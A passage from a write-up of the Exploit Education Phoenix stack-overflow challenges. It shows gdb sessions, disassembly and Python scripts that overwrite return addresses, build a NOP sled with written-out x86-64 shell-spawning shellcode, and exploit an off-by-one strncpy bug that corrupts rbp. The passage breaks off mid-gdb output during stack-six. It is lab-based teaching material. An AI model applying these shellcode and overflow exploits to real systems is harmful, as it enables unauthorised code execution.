  400639:       48 83 ec 50             sub    $0x50,%rsp
  40063d:       48 8d 45 b0             lea    -0x50(%rbp),%rax
  400641:       48 89 c7                mov    %rax,%rdi
  400644:       e8 27 fe ff ff          callq  400470 <gets@plt>
  400649:       48 8b 45 08             mov    0x8(%rbp),%rax
  40064d:       48 89 45 f8             mov    %rax,-0x8(%rbp)
  400651:       48 8b 45 f8             mov    -0x8(%rbp),%rax
  400655:       48 89 c6                mov    %rax,%rsi
  400658:       bf 33 07 40 00          mov    $0x400733,%edi
  40065d:       b8 00 00 00 00          mov    $0x0,%eax
  400662:       e8 f9 fd ff ff          callq  400460 <printf@plt>
  400667:       90                      nop
  400668:       c9                      leaveq 
  400669:       c3                      retq   

000000000040066a <main>:
  40066a:       55                      push   %rbp
  40066b:       48 89 e5                mov    %rsp,%rbp
  40066e:       48 83 ec 10             sub    $0x10,%rsp
  400672:       89 7d fc                mov    %edi,-0x4(%rbp)
  400675:       48 89 75 f0             mov    %rsi,-0x10(%rbp)
  400679:       bf 50 07 40 00          mov    $0x400750,%edi
  40067e:       e8 fd fd ff ff          callq  400480 <puts@plt>
  400683:       b8 00 00 00 00          mov    $0x0,%eax
  400688:       e8 a8 ff ff ff          callq  400635 <start_level>
  40068d:       b8 00 00 00 00          mov    $0x0,%eax
  400692:       c9                      leaveq 
  400693:       c3                      retq   
  400694:       66 2e 0f 1f 84 00 00    nopw   %cs:0x0(%rax,%rax,1)
  40069b:       00 00 00 
  40069e:       66 90                   xchg   %ax,%ax

00000000004006a0 <__do_global_ctors_aux>:
  4006a0:       48 8b 05 c9 01 20 00    mov    0x2001c9(%rip),%rax        # 600870 <__CTOR_LIST__>
  4006a7:       48 83 f8 ff             cmp    $0xffffffffffffffff,%rax
  4006ab:       74 33                   je     4006e0 <__do_global_ctors_aux+0x40>
  4006ad:       55                      push   %rbp
  4006ae:       48 89 e5                mov    %rsp,%rbp
  4006b1:       53                      push   %rbx
  4006b2:       bb 70 08 60 00          mov    $0x600870,%ebx
  4006b7:       48 83 ec 08             sub    $0x8,%rsp
  4006bb:       0f 1f 44 00 00          nopl   0x0(%rax,%rax,1)
  4006c0:       48 83 eb 08             sub    $0x8,%rbx
  4006c4:       ff d0                   callq  *%rax
  4006c6:       48 8b 03                mov    (%rbx),%rax
  4006c9:       48 83 f8 ff             cmp    $0xffffffffffffffff,%rax
  4006cd:       75 f1                   jne    4006c0 <__do_global_ctors_aux+0x20>
  4006cf:       48 83 c4 08             add    $0x8,%rsp
  4006d3:       5b                      pop    %rbx
  4006d4:       5d                      pop    %rbp
  4006d5:       c3                      retq   
  4006d6:       66 2e 0f 1f 84 00 00    nopw   %cs:0x0(%rax,%rax,1)
  4006dd:       00 00 00 
  4006e0:       f3 c3                   repz retq 

Disassembly of section .fini:

00000000004006e2 <_fini>:
  4006e2:       50                      push   %rax
  4006e3:       e8 78 fe ff ff          callq  400560 <__do_global_dtors_aux>
  4006e8:       58                      pop    %rax
  4006e9:       c3                      retq   
```
 
Objdumping the program gets us 0x40061d for the location of the complete_level function. Adding the hexcode \x1d\x06\x40 in the place where VWWWWXXX was in the input we did solves the challenge. 
 
```bash
user@phoenix-amd64:~$ python -c "print('AAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVV' + '\x1d\x06\x40')" | /opt/phoenix/amd64/stack-four 
Welcome to phoenix/stack-four, brought to you by https://exploit.education
and will be returning to 0x40061d
Congratulations, you've finished phoenix/stack-four :-) Well done!
```

## Challenge 6 - Stack Five

[Stack Five Code](https://exploit.education/phoenix/stack-five/). 

This challenge is like the last challenge except there is no function we need to call to complete it. This requires us to make our own function to run using shell code. The buffer variable's size is now 160 bytes so we will need to input more than that into the user input. We’ll start by making a python script that is from A-Z, but expanded so that it fills the whole 160 bytes of the buffer. 

```python
padding = "AAAAAAABBBBBBBCCCCCCCDDDDDDDEEEEEEEFFFFFFFGGGGGGGHHHHHHHIIIIIIIJJJJJJJKKKKKKKLLLLLLLMMMMMMMMNNNNNNNOOOOOOOPPPPPPPQQQQQQQQRRRRRRRSSSSSSSTTTTTTTUUUUUUUUVVVVVVVWWWWWWWWXXXXXXXXYYYYYYYZZZZZZZ"
print(padding)
```

Before running gdb we will need redirect our python script’s output to a temporary file. This way we can use that file for our user input. Now we will use gdb to create a breakpoint in the start_level function where that function calling return. We use the gdb command disas or disassemble to disassemble the start_level function. Then we set a breakpoint at the return call by using the command break and giving it the hex code of the return call’s location. Now we run the program while also redirecting the file from earlier to be used as the user input. Our breakpoint will get hit, then we need to step through the code once. If we now check the instruction pointer or rip. It will be pointing to address location 0x5555555454545454 or UUUTTTTT. We know now that the buffer is overflowing, and that it is overwriting the instruction pointer. Which means we can point this return to any code we want. Since in this challenge there isn’t a function we need to call by having the rip point to, we need to make our own. But first we need to test if we can get our own code to run by inserting CC hexcode on to the stack and having rip point to it. What CC should do is call the built in cpu interrupt and interrupt the code for us exactly like a breakpoint. This will tell us that out exploit is working. To get the location on the stack we need the CC’s to be. We can look at where we have overwritten it with our input. Using x/64s on the rsp or stack pointer we can see that we overwritten the stack at location 0x7FFFFFFFe670. That’s where we want rip to point to and the CC’s to be located.

```bash
user@phoenix-amd64:~$ python stack-five.py > /tmp/alpha
user@phoenix-amd64:~$ gdb /opt/phoenix/amd64/stack-five 
(gdb) disas start_level
Dump of assembler code for function start_level:
   0x000000000040058d <+0>:     push   rbp
   0x000000000040058e <+1>:     mov    rbp,rsp
   0x0000000000400591 <+4>:     add    rsp,0xffffffffffffff80
   0x0000000000400595 <+8>:     lea    rax,[rbp-0x80]
   0x0000000000400599 <+12>:    mov    rdi,rax
   0x000000000040059c <+15>:    call   0x4003f0 <gets@plt>
   0x00000000004005a1 <+20>:    nop
   0x00000000004005a2 <+21>:    leave  
   0x00000000004005a3 <+22>:    ret    
End of assembler dump.
(gdb) break *0x4005a3
Breakpoint 1 at 0x4005a3
(gdb) r < /tmp/alpha 
Starting program: /opt/phoenix/amd64/stack-five < /tmp/alpha
Welcome to phoenix/stack-five, brought to you by https://exploit.education

Breakpoint 1, 0x00000000004005a3 in start_level ()
(gdb) si
0x5555555454545454 in ?? ()
(gdb) x/s $rip
0x5555555454545454:     <error: Cannot access memory at address 0x5555555454545454>
(gdb) x/64s $rsp
0x7fffffffe670: "UUUUUUVVVVVVVWWWWWWWWXXXXXXXXYYYYYYYZZZZZZZ"
0x7fffffffe69c: ""
0x7fffffffe69d: "\177"
0x7fffffffe69f: ""
0x7fffffffe6a0: ""
0x7fffffffe6a1: ""
0x7fffffffe6a2: ""
0x7fffffffe6a3: ""
0x7fffffffe6a4: ""
0x7fffffffe6a5: ""
0x7fffffffe6a6: ""
0x7fffffffe6a7: ""
0x7fffffffe6a8: "\310\333\377\367\377\177"
0x7fffffffe6af: ""
0x7fffffffe6b0: ""
0x7fffffffe6b1: ">"
0x7fffffffe6b3: ""
0x7fffffffe6b4: "\001"
0x7fffffffe6b6: ""
0x7fffffffe6b7: "\004Y\004@"
0x7fffffffe6bc: ""
0x7fffffffe6bd: ""
0x7fffffffe6be: ""
0x7fffffffe6bf: ""
0x7fffffffe6c0: ""
0x7fffffffe6c1: ""
0x7fffffffe6c2: ""
0x7fffffffe6c3: ""
0x7fffffffe6c4: ""
0x7fffffffe6c5: ""
0x7fffffffe6c6: ""
0x7fffffffe6c7: ""
0x7fffffffe6c8: "6\004@"
0x7fffffffe6cc: ""
0x7fffffffe6cd: ""
0x7fffffffe6ce: ""
0x7fffffffe6cf: ""
0x7fffffffe6d0: "\001"
0x7fffffffe6d2: ""
0x7fffffffe6d3: ""
0x7fffffffe6d4: ""
0x7fffffffe6d5: ""
0x7fffffffe6d6: ""
0x7fffffffe6d7: ""
0x7fffffffe6d8: "\307\350\377\377\377\177"
0x7fffffffe6df: ""
0x7fffffffe6e0: ""
0x7fffffffe6e1: ""
0x7fffffffe6e2: ""
0x7fffffffe6e3: ""
0x7fffffffe6e4: ""
0x7fffffffe6e5: ""
0x7fffffffe6e6: ""
0x7fffffffe6e7: ""
0x7fffffffe6e8: "\345\350\377\377\377\177"
0x7fffffffe6ef: ""
0x7fffffffe6f0: "\241\356\377\377\377\177"
0x7fffffffe6f7: ""
0x7fffffffe6f8: "\314\356\377\377\377\177"
0x7fffffffe6ff: ""
0x7fffffffe700: "\341\356\377\377\377\177"
0x7fffffffe707: ""
0x7fffffffe708: "\353\356\377\377\377\177"
0x7fffffffe70f: ""
```
Our python script can be modified to allow us to get the rip to point to stack location 0x7FFFFFFFe670 and have CC’s at that location. We can run a separate terminal instance and modify the python script to insert hexcode \x70\xe6\xff\xff\xff\x7f\x00\x00 after the first T in out alphabet string. We know to insert it there, because when we looked at the instruction pointer after the return call it was pointing to UUUTTTTT. We know that rip gets overwritten there, so we can insert the location on the stack there. There reason will the stack location is backwards is to account for endianness . After the stack location we can insert a few CC hexcodes, so we can test if our own code can run. We then run the python script and overwrite the temporary file with the new one we created. 

```python
padding = "AAAAAAABBBBBBBCCCCCCCDDDDDDDEEEEEEEFFFFFFFGGGGGGGHHHHHHHIIIIIIIJJJJJJJKKKKKKKLLLLLLLMMMMMMMMNNNNNNNOOOOOOOPPPPPPPQQQQQQQQRRRRRRRSSSSSSST"
rip = b'\x70\xe6\xff\xff\xff\x7f\x00\x00'
shell = b'\xCC'*8
print(padding+rip+shell)
```
Now if we rerun the program on gdb and continue it after hitting the breakpoint. The program will hit a SIGTRAP signal at the address location 0x00007FFFFFFFe671, which is our CC hexcodes being hit. This means we can run own our code of whatever we want. But before getting we get to that part if we quit gdb and try to run the program with our python script as the user input. We get Segmentation Fault. Why? The reason we get this, is because the location we told the instruction pointer to go to. The CC’s aren’t there. The got moved around on the stack because every different time the code is ran the stack can be offset a tiny bit by very small things like the directory location the user call the program from. 

```bash
(gdb) r < /tmp/alpha 
Starting program: /opt/phoenix/amd64/stack-five < /tmp/alpha
Welcome to phoenix/stack-five, brought to you by https://exploit.education

Breakpoint 1, 0x00000000004005a3 in start_level ()
(gdb) si
0x00007fffffffe670 in ?? ()
(gdb) c
Continuing.

Program received signal SIGTRAP, Trace/breakpoint trap.
0x00007fffffffe671 in ?? ()
(gdb) quit
user@phoenix-amd64:~$ python stack-five.py | /opt/phoenix/amd64/stack-five
Welcome to phoenix/stack-five, brought to you by https://exploit.education
Segmentation fault
```
To fix this we can stuff the stack with the hexcodes 90. This is called the NOP opcode which when the instruction pointer hits it no code is ran. This allows us to make a buffer in the stack with a ton of NOP instructions, so we are bound to hit one. Once one is it the instruction pointer can slide down the NOPs and then hit our shellcode  or machine code designed to be used in exploiting overwritten instruction pointers. It is best to use already made shellcode like from [here](http://shell-storm.org). We just need shellcode that is for the right architecture for our machine. We need Linux x86-64 architecture shell code. The code I picked is [this](http://shell-storm.org/shellcode/files/shellcode-806.php). Now we can recreate our python script to point the rip to a random stack address after the one we found earlier. Then pad the stack with a top of NOP instructions so we can hit one of them instead of a precise location of our shellcode. Now lastly we will add the shellcode that will allow us to have a command shell inside the program.  


### Solved

```python
padding = "AAAAAAABBBBBBBCCCCCCCDDDDDDDEEEEEEEFFFFFFFGGGGGGGHHHHHHHIIIIIIIJJJJJJJKKKKKKKLLLLLLLMMMMMMMMNNNNNNNOOOOOOOPPPPPPPQQQQQQQQRRRRRRRSSSSSSST"
rip = b'\x90\xe6\xff\xff\xff\x7f\x00\x00'
nop = b'\x90'*100
shell = b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
print(padding+rip+nop+shell)
```
Now we just pipe the output into the programs user input and get a command shell. But, we need to use “; cat” when piping the python scripts output. Cat by itself redirects input to output allowing use to give our shell any input we want. Running whoami command shows us that we are the program and that we have exploited the program’s buffer overflow.

```bash
user@phoenix-amd64:~$ (python stack-five.py ; cat) | /opt/phoenix/amd64/stack-five
Welcome to phoenix/stack-five, brought to you by https://exploit.education
whoami
phoenix-amd64-stack-five

```
## Challenge 7 - Stack Six

[Stack Six Code](https://exploit.education/phoenix/stack-six/). 

This challenge can be quiet tricky. By looking at the code it isn't obvious what the problem is. The first place to start is looking at the greet function.

```c++
char *greet(char *who) {
  char buffer[128];
  int maxSize;

  maxSize = strlen(who);
  if (maxSize > (sizeof(buffer) - /* ensure null termination */ 1)) {
    maxSize = sizeof(buffer) - 1;
  }

  strcpy(buffer, what);
  strncpy(buffer + strlen(buffer), who, maxSize);

  return strdup(buffer);
}
```

It is only after really digging through and thinking about how the code is running I noticed the bug. The program try's to limit the user input to only 127 bytes which is good, but when it is copying those characters onto the buffer it overflows. The program doesn't take into count that there is already characters in the buffer and the length of those characters should be subtracted from the maxSize variable. This causes a buffer overflow but not by much depending on how big the what variable is.

```c++
strncpy(buffer + strlen(buffer), who, maxSize);
```

To figure out how much we overflow the buffer we can create a python script that just prints out 127 As.

```python
padding = "A" * 127
print(padding)
```
We then put the output of that script into the ExploitEducation environment variable then run the program in gdb. We disassemble the greet function and put break points before and after the input contents are copied onto the buffer, so we can see the overflow. After the first breakpoint we check the registers and everything seems fine. We can continue to the next. At the next breakpoint when checking the registers you may notice that rbp has a 41 in it and that wasn't there before. Rpb is the base pointer it was pointing to the the stack address that main will return to. Meaning A, it shouldn't be changed especially with a hexcode for A. B, it can allow us to change where the main function returns to.

```bash
user@phoenix-amd64:~$ export ExploitEducation=$(python stack-six.py)
user@phoenix-amd64:~$ gdb /opt/phoenix/amd64/stack-six 
(gdb) disas greet
Dump of assembler code for function greet:
   0x00000000004006fd <+0>:     push   rbp
   0x00000000004006fe <+1>:     mov    rbp,rsp
   0x0000000000400701 <+4>:     push   rbx
   0x0000000000400702 <+5>:     sub    rsp,0xa8
   0x0000000000400709 <+12>:    mov    QWORD PTR [rbp-0xa8],rdi
   0x0000000000400710 <+19>:    mov    rax,QWORD PTR [rbp-0xa8]
   0x0000000000400717 <+26>:    mov    rdi,rax
   0x000000000040071a <+29>:    call   0x400580 <strlen@plt>
   0x000000000040071f <+34>:    mov    DWORD PTR [rbp-0x14],eax
   0x0000000000400722 <+37>:    mov    eax,DWORD PTR [rbp-0x14]
   0x0000000000400725 <+40>:    cmp    eax,0x7f
   0x0000000000400728 <+43>:    jbe    0x400731 <greet+52>
   0x000000000040072a <+45>:    mov    DWORD PTR [rbp-0x14],0x7f
   0x0000000000400731 <+52>:    mov    rdx,QWORD PTR [rip+0x200458]        # 0x600b90 <what>
   0x0000000000400738 <+59>:    lea    rax,[rbp-0xa0]
   0x000000000040073f <+66>:    mov    rsi,rdx
   0x0000000000400742 <+69>:    mov    rdi,rax
   0x0000000000400745 <+72>:    call   0x400510 <strcpy@plt>
   0x000000000040074a <+77>:    mov    eax,DWORD PTR [rbp-0x14]
   0x000000000040074d <+80>:    movsxd rbx,eax
   0x0000000000400750 <+83>:    lea    rax,[rbp-0xa0]
   0x0000000000400757 <+90>:    mov    rdi,rax
   0x000000000040075a <+93>:    call   0x400580 <strlen@plt>
   0x000000000040075f <+98>:    mov    rdx,rax
   0x0000000000400762 <+101>:   lea    rax,[rbp-0xa0]
   0x0000000000400769 <+108>:   lea    rcx,[rax+rdx*1]
   0x000000000040076d <+112>:   mov    rax,QWORD PTR [rbp-0xa8]
   0x0000000000400774 <+119>:   mov    rdx,rbx
   0x0000000000400777 <+122>:   mov    rsi,rax
   0x000000000040077a <+125>:   mov    rdi,rcx
   0x000000000040077d <+128>:   call   0x400550 <strncpy@plt>
   0x0000000000400782 <+133>:   lea    rax,[rbp-0xa0]
   0x0000000000400789 <+140>:   mov    rdi,rax
   0x000000000040078c <+143>:   call   0x400560 <strdup@plt>
   0x0000000000400791 <+148>:   add    rsp,0xa8
   0x0000000000400798 <+155>:   pop    rbx
   0x0000000000400799 <+156>:   pop    rbp
   0x000000000040079a <+157>:   ret    
End of assembler dump.
(gdb) break *0x40077a
Breakpoint 1 at 0x40077a
(gdb) break *0x40079a
Breakpoint 2 at 0x40079a
(gdb) r
Starting program: /opt/phoenix/amd64/stack-six 
Welcome to phoenix/stack-six, brought to you by https://exploit.education

Breakpoint 1, 0x000000000040077a in greet ()
(gdb) info reg
rax            0x7fffffffef0f      0x7fffffffef0f
rbx            0x7f                0x7f
rcx            0x7fffffffe562      0x7fffffffe562
rdx            0x7f                0x7f
rsi            0x7fffffffef0f      0x7fffffffef0f
rdi            0x7fffffffe562      0x7fffffffe562
rbp            0x7fffffffe5e0      0x7fffffffe5e0
rsp            0x7fffffffe530      0x7fffffffe530
r8             0x7fffffffe540      0x7fffffffe540
r9             0xfefefefefefefeff  0xfefefefefefefeff
r10            0x0                 0x0
r11            0x202               0x202
r12            0x7fffffffe678      0x7fffffffe678
r13            0x40079b            0x40079b
r14            0x0                 0x0
r15            0x0                 0x0
rip            0x40077a            0x40077a <greet+125>
eflags         0x206               [ PF IF ]
cs             0x33                0x33
ss             0x2b                0x2b
ds             0x0                 0x0
es             0x0                 0x0
fs             0x0                 0x0
gs             0x0                 0x0
(gdb) c
Continuing.

Breakpoint 2, 0x000000000040079a in greet ()
(gdb) info reg
rax            0x600c00            0x600c00
rbx            0x4141414141414141  0x4141414141414141
rcx            0x0                 0x0
rdx            0x0                 0x0
rsi            0x7fffffffe5e7      0x7fffffffe5e7
rdi            0x600ca7            0x600ca7
rbp            0x7fffffffe641      0x7fffffffe641
rsp            0x7fffffffe5e8      0x7fffffffe5e8
r8             0x1f                0x1f
r9             0xfefefefefefefeff  0xfefefefefefefeff
r10            0x0                 0x0
r11            0x202               0x202
r12            0x7fffffffe678      0x7fffffffe678
r13            0x40079b            0x40079b
r14            0x0                 0x0
r15            0x0                 0x0
rip            0x40079a            0x40079a <greet+157>
eflags         0x206               [ PF IF ]
cs             0x33                0x33
ss             0x2b                0x2b
ds             0x0                 0x0
es             0x0                 0x0
fs             0x0                 0x0
gs             0x0                 0x0

```

First I made a new script to test if it wasn't a fluke that rbp was changed to 41 at the last byte.

```python
padding = "A" * 126 + "Z"
print(padding)
```
Running the script and checking the rbp value again confirms that we are overwriting the rbp value. How can we know exploit this and where can we jump to. Since we can only change 1 byte we are very limited to where we can jump to. 0x7fffffffe600 - 0x7fffffffe6ff is the only area in the code we can look for a jumping point. Creating a breakpoint at the return call in main we can check whats in the addresses of 0x7fffffffe600 - 0x7fffffffe6ff. We can see quiet a few places we can jump to, but how do we know whats a place we can put data in. Now if we dump all of the stack pointer we can look for places on the stack we can manipulate. We can see that the ExploitEducation variable is at 0x7fffffffeeff, so any where between that and 0x7fffffffef90 is a great place to jump because we control it. We can see that back on the stack at 0x7fffffffe608 is 0x00007fffffffef10, which is perfect for what we want. I am gonna start by saying this is where I got stumped. In order for the instruction pointer we need to have rbp set to 0x7fffffffe600. The problem is python will not print a 0x00 character because it is a null byte. I really had to think of a way around this.

```bash
user@phoenix-amd64:~$ export ExploitEducation=$(python stack-six.py)
user@phoenix-amd64:~$ gdb /opt/phoenix/amd64/stack-six 
(gdb) break *0x40079a
Breakpoint 1 at 0x40079a
(gdb) r
Starting program: /opt/phoenix/amd64/stack-six 
Welcome to phoenix/stack-six, brought to you by https://exploit.education

Breakpoint 1, 0x000000000040079a in greet ()

(gdb) info reg
rax            0x600c00            0x600c00
rbx            0x4141414141414141  0x4141414141414141
rcx            0x0                 0x0
rdx            0x0                 0x0
rsi            0x7fffffffe5e7      0x7fffffffe5e7
rdi            0x600ca7            0x600ca7
rbp            0x7fffffffe65a      0x7fffffffe65a
rsp            0x7fffffffe5e8      0x7fffffffe5e8
r8             0x1f                0x1f
r9             0xfefefefefefefeff  0xfefefefefefefeff
r10            0x0                 0x0
r11            0x202               0x202
r12            0x7fffffffe678      0x7fffffffe678
r13            0x40079b            0x40079b
r14            0x0                 0x0
r15            0x0                 0x0
rip            0x40079a            0x40079a <greet+157>
eflags         0x206               [ PF IF ]
cs             0x33                0x33
ss             0x2b                0x2b
ds             0x0                 0x0
es             0x0                 0x0
fs             0x0                 0x0
gs             0x0                 0x0
(gdb) disas main
Dump of assembler code for function main:
   0x000000000040079b <+0>:     push   rbp
   0x000000000040079c <+1>:     mov    rbp,rsp
   0x000000000040079f <+4>:     sub    rsp,0x20
   0x00000000004007a3 <+8>:     mov    DWORD PTR [rbp-0x14],edi
   0x00000000004007a6 <+11>:    mov    QWORD PTR [rbp-0x20],rsi
   0x00000000004007aa <+15>:    mov    edi,0x400878
   0x00000000004007af <+20>:    call   0x400530 <puts@plt>
   0x00000000004007b4 <+25>:    mov    edi,0x4008c2
   0x00000000004007b9 <+30>:    call   0x400520 <getenv@plt>
   0x00000000004007be <+35>:    mov    QWORD PTR [rbp-0x8],rax
   0x00000000004007c2 <+39>:    cmp    QWORD PTR [rbp-0x8],0x0
   0x00000000004007c7 <+44>:    jne    0x4007dd <main+66>
   0x00000000004007c9 <+46>:    mov    esi,0x4008d8
   0x00000000004007ce <+51>:    mov    edi,0x1
   0x00000000004007d3 <+56>:    mov    eax,0x0
   0x00000000004007d8 <+61>:    call   0x400540 <errx@plt>
   0x00000000004007dd <+66>:    mov    rax,QWORD PTR [rbp-0x8]
   0x00000000004007e1 <+70>:    mov    rdi,rax
   0x00000000004007e4 <+73>:    call   0x4006fd <greet>
   0x00000000004007e9 <+78>:    mov    rdi,rax
   0x00000000004007ec <+81>:    call   0x400530 <puts@plt>
   0x00000000004007f1 <+86>:    mov    eax,0x0
   0x00000000004007f6 <+91>:    leave  
   0x00000000004007f7 <+92>:    ret    
End of assembler dump.
Python Exception <class 'UnicodeEncodeError'> 'ascii' codec can't encode character '\u27a4' in position 12: ordinal not in range(128): 
(gdb) break *0x4007f7
Breakpoint 2 at 0x4007f7
Python Exception <class 'UnicodeEncodeError'> 'ascii' codec can't encode character '\u27a4' in position 12: ordinal not in range(128): 
(gdb) c
Continuing.
Welcome, I am pleased to meet you AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAZ����

Breakpoint 2, 0x00000000004007f7 in main ()
(gdb) x/32xg 0x7fffffffe600
0x7fffffffe600: 0x000000000040079b      0x00007fffffffef10
0x7fffffffe610: 0x0000000000000001      0x00007ffff7d8fd62
0x7fffffffe620: 0x0000000000000000      0x00007fffffffe660
0x7fffffffe630: 0x0000000000000000      0x00007ffff7ffdbc8
0x7fffffffe640: 0x0400000100003e00      0x00000000004005c9
0x7fffffffe650: 0x0000000000000000      0x00000000004005a6
0x7fffffffe660: 0x0000000000000001      0x00007fffffffe843
0x7fffffffe670: 0x0000000000000000      0x00007fffffffe860
0x7fffffffe680: 0x00007fffffffee1c      0x00007fffffffee47
0x7fffffffe690: 0x00007fffffffee66      0x00007fffffffee70
0x7fffffffe6a0: 0x00007fffffffee7f      0x00007fffffffee8f
0x7fffffffe6b0: 0x00007fffffffeeac      0x00007fffffffeebf
0x7fffffffe6c0: 0x00007fffffffeed3      0x00007fffffffeee3
0x7fffffffe6d0: 0x00007fffffffeef7      0x00007fffffffeeff
0x7fffffffe6e0: 0x00007fffffffef90      0x00007fffffffef9d
0x7fffffffe6f0: 0x0000000000000000      0x0000000000000021
(gdb) x/1000s $rsp
0x7fffffffe662: ""
...
0x7fffffffe843: "/opt/phoenix/amd64/stack-six"
0x7fffffffe860: "LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:"
0x7fffffffee1c: "SSH_CONNECTION=10.0.2.2 59496 10.0.2.15 22"
0x7fffffffee47: "_=/opt/phoenix/amd64/stack-six"
0x7fffffffee66: "USER=user"
0x7fffffffee70: "PWD=/home/user"
0x7fffffffee7f: "HOME=/home/user"
0x7fffffffee8f: "SSH_CLIENT=10.0.2.2 59496 22"
0x7fffffffeeac: "SSH_TTY=/dev/pts/1"
0x7fffffffeebf: "MAIL=/var/mail/user"
0x7fffffffeed3: "SHELL=/bin/bash"
0x7fffffffeee3: "TERM=xterm-256color"
0x7fffffffeef7: "SHLVL=1"
0x7fffffffeeff: "ExploitEducation=", 'A' <repeats 126 times>, "Z"
0x7fffffffef90: "LOGNAME=user"
0x7fffffffef9d: "PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games"
0x7fffffffefdb: "/opt/phoenix/amd64/stack-six"
...
0x7ffffffff000: <error: Cannot access memory at address 0x7ffffffff000>
```

So after thinking about the problem at hand for a bit my decision was to run the program from a different folder. I made of folders and ran gdb again to check the stack addresses for everything again. ExploitEducation is at 0x7fffffffef00 and rbp needs to be in the 0x7fffffffe500-0x7fffffffe5ff range. This time the address I need is 0x7fffffffe5c8, so I need python to only print out 0xc0 which is a lot more doable. I then created a script that has a bunch of NOPs and a shellcode that gives me a command shell inside the program. The last character in the python script's output is 0xc0. That way after main's return call it the program will jump to 0x00007fffffffef10 and be executing code somewhere in our environment variable.

```bash
(gdb) x/1000s $rsp
0x7fffffffe5b0: "(\346\377\377\377\177"
...
0x7fffffffe81b: "/opt/phoenix/amd64/stack-six"
0x7fffffffe838: "LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:"
